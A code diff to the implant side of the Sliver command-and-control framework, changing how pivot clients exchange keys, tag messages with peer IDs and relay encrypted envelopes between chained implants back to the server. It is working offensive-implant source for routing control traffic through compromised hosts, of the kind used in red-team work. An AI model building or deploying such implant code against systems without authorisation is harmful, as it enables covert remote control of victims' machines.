@@ -20,7 +20,6 @@ package pivotclients
 
 import (
 	"bytes"
-	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
 	"errors"
@@ -32,26 +31,16 @@ import (
 	"log"
 	// {{end}}
 
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 )
 
-var (
-	OriginID = originID() // The origin's PeerID
-)
-
-// originID - Random origin identifier
-func originID() int64 {
-	buf := make([]byte, 8)
-	rand.Read(buf)
-	return int64(binary.LittleEndian.Uint64(buf))
-}
-
-// NetConnPivotClient - A TCP pivot client
+// NetConnPivotClient - A generic net.Conn pivot client
 type NetConnPivotClient struct {
-	originID        int64
 	pivotSessionID  []byte
 	conn            net.Conn
 	readMutex       *sync.Mutex
@@ -92,6 +81,7 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 	}
 	pivotHello, _ := proto.Marshal(&pb.PivotHello{
 		PublicKey:          publicKey,
+		PeerID:             pivots.MyPeerID,
 		PublicKeySignature: cryptography.ECCPublicKeySignature,
 	})
 
@@ -131,26 +121,33 @@ func (p *NetConnPivotClient) peerKeyExchange() error {
 }
 
 func (p *NetConnPivotClient) serverKeyExchange() error {
-	p.originID = OriginID
 	serverSessionKey := cryptography.RandomKey()
 	p.serverCipherCtx = cryptography.NewCipherContext(serverSessionKey)
 	ciphertext, err := cryptography.ECCEncryptToServer(serverSessionKey[:])
 	if err != nil {
 		return err
 	}
-	pivotServerKeyExchange, _ := proto.Marshal(&pb.PivotServerKeyExchange{
-		OriginID:   p.originID,
+	pivotServerKeyExchangeData, _ := proto.Marshal(&pb.PivotServerKeyExchange{
+		OriginID:   pivots.MyPeerID,
 		SessionKey: ciphertext,
 	})
-	pivotServerKeyExchangeEnvelope, _ := proto.Marshal(&pb.Envelope{
+	peerEnvelopeData, _ := proto.Marshal(&pb.PivotPeerEnvelope{
+		Peers: []*pb.PivotPeer{
+			{PeerID: pivots.MyPeerID, Name: consts.SliverName},
+		},
 		Type: pb.MsgPivotServerKeyExchange,
-		Data: pivotServerKeyExchange,
+		Data: pivotServerKeyExchangeData,
+	})
+	pivotServerKeyExchangeEnvelope, _ := proto.Marshal(&pb.Envelope{
+		Type: pb.MsgPivotPeerEnvelope,
+		Data: peerEnvelopeData,
 	})
 	keyExchangeCiphertext, err := p.peerCipherCtx.Encrypt(pivotServerKeyExchangeEnvelope)
 	if err != nil {
 		return err
 	}
 	// {{if .Config.Debug}}
+	log.Printf("[pivot] my peer id: %d", pivots.MyPeerID)
 	log.Printf("[pivot] Sending server key exchange ...")
 	// {{end}}
 	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
@@ -167,23 +164,33 @@ func (p *NetConnPivotClient) serverKeyExchange() error {
 	// a different read deadline here as this has to go round trip to the server if the
 	// upstream implant uses a slow protocol it may take a while to go there and back again
 	p.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
-	serverKeyExchangeResp, err := p.ReadEnvelope()
+	serverKeyExRespEnvelope, err := p.ReadEnvelope()
 	p.conn.SetReadDeadline(time.Time{})
 	if err != nil {
 		return err
 	}
-	if serverKeyExchangeResp.Type != pb.MsgPivotServerKeyExchange {
+	if serverKeyExRespEnvelope.Type != pb.MsgPivotServerKeyExchange {
 		// {{if .Config.Debug}}
-		log.Printf("[pivot] Unexpected message type: %v", serverKeyExchangeResp.Type)
+		log.Printf("[pivot] Unexpected message type: %v", serverKeyExRespEnvelope.Type)
 		// {{end}}
 		return errors.New("server key exchange failure")
 	}
+
+	serverKeyExResp := &pb.PivotServerKeyExchange{}
+	err = proto.Unmarshal(serverKeyExRespEnvelope.Data, serverKeyExResp)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] Error un-marshaling server key exchange response: %v", err)
+		// {{end}}
+		return err
+	}
+
 	// Just make sure we can parse the bytes
-	p.pivotSessionID = uuid.FromBytesOrNil(serverKeyExchangeResp.Data).Bytes()
+	p.pivotSessionID = uuid.FromBytesOrNil(serverKeyExResp.SessionKey).Bytes()
 
 	// {{if .Config.Debug}}
 	log.Printf("[pivot] Pivot session ID: %s",
-		uuid.FromBytesOrNil(serverKeyExchangeResp.Data).String(),
+		uuid.FromBytesOrNil(p.pivotSessionID).String(),
 	)
 	// {{end}}
 
@@ -274,9 +281,9 @@ func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 		return err
 	}
 	var peerPlaintext []byte
-	if envelope.Type != pb.MsgPivotPeerPing {
-		// Prepend the message with the pivot session ID
-		// note this can only be done after the server key change
+
+	// Do not wrap pivot messages since we're not the origin
+	if envelope.Type != pb.MsgPivotPeerPing && envelope.Type != pb.MsgPivotPeerEnvelope {
 		ciphertext, err := p.serverCipherCtx.Encrypt(plaintext)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -284,15 +291,27 @@ func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 			// {{end}}
 			return err
 		}
-		msgBuf := make([]byte, len(p.pivotSessionID)+len(ciphertext))
-		copy(msgBuf, p.pivotSessionID)
-		copy(msgBuf[len(p.pivotSessionID):], ciphertext)
-		peerPlaintext, _ = proto.Marshal(&pb.Envelope{
-			Type: pb.MsgPivotOriginEnvelope,
-			Data: msgBuf,
+		peerData, err := proto.Marshal(&pb.PivotPeerEnvelope{
+			Type: pb.MsgPivotSessionEnvelope,
+			Peers: []*pb.PivotPeer{
+				{PeerID: pivots.MyPeerID, Name: consts.SliverName},
+			},
+			PivotSessionID: p.pivotSessionID,
+			Data:           ciphertext,
 		})
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[pivot] Marshaling peer error: %s", err)
+			// {{end}}
+			return err
+		}
+		peerPlaintext, _ = proto.Marshal(&pb.Envelope{
+			Type: pb.MsgPivotPeerEnvelope,
+			Data: peerData,
+		})
+
 	} else {
-		// Pivot pings are not encrypted with the sever key
+		// Pivot pings and existing peer envelopes are not encrypted with the sever key
 		peerPlaintext = plaintext
 	}
 
@@ -322,24 +341,46 @@ func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 		// {{end}}
 		return nil, err
 	}
-	peerEnvelope := &pb.Envelope{}
-	err = proto.Unmarshal(data, peerEnvelope)
+	incomingEnvelope := &pb.Envelope{}
+	err = proto.Unmarshal(data, incomingEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[pivot] Error unmarshal origin envelope: %v", err)
 		// {{end}}
 		return nil, err
 	}
+
+	// {{if .Config.Debug}}
+	log.Printf("[pivot] Received incoming envelope: %+v", incomingEnvelope)
+	// {{end}}
+
 	// The only msg type that isn't encrypted by the server should be pivot pings
-	if peerEnvelope.Type == pb.MsgPivotPeerPing {
-		return peerEnvelope, nil
+	if incomingEnvelope.Type == pb.MsgPivotPeerPing {
+		return incomingEnvelope, nil
 	}
-	if peerEnvelope.Type != pb.MsgPivotOriginEnvelope {
+	if incomingEnvelope.Type != pb.MsgPivotPeerEnvelope {
+		return nil, errors.New("invalid message type")
+	}
+	peerEnvelope := &pb.PivotPeerEnvelope{}
+	err = proto.Unmarshal(incomingEnvelope.Data, peerEnvelope)
+	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[pivot] Error unexpected envelope type (non-origin)")
+		log.Printf("[pivot] Error unmarshal peer envelope: %v", err)
 		// {{end}}
 		return nil, err
 	}
+	if len(peerEnvelope.Peers) < 1 {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] Empty peer list")
+		// {{end}}
+		return nil, errors.New("empty peer list")
+	}
+
+	// If we're not the origin this peer envelope is not for us
+	if peerEnvelope.Peers[0].PeerID != pivots.MyPeerID {
+		return incomingEnvelope, nil
+	}
+
 	plaintext, err := p.serverCipherCtx.Decrypt(peerEnvelope.Data)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -349,13 +390,7 @@ func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
 	}
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(plaintext, envelope)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[pivot] Error unmarshal envelope: %v", err)
-		// {{end}}
-		return nil, err
-	}
-	return envelope, nil
+	return envelope, err
 }
 
 // CloseSession - Close the TCP pivot session
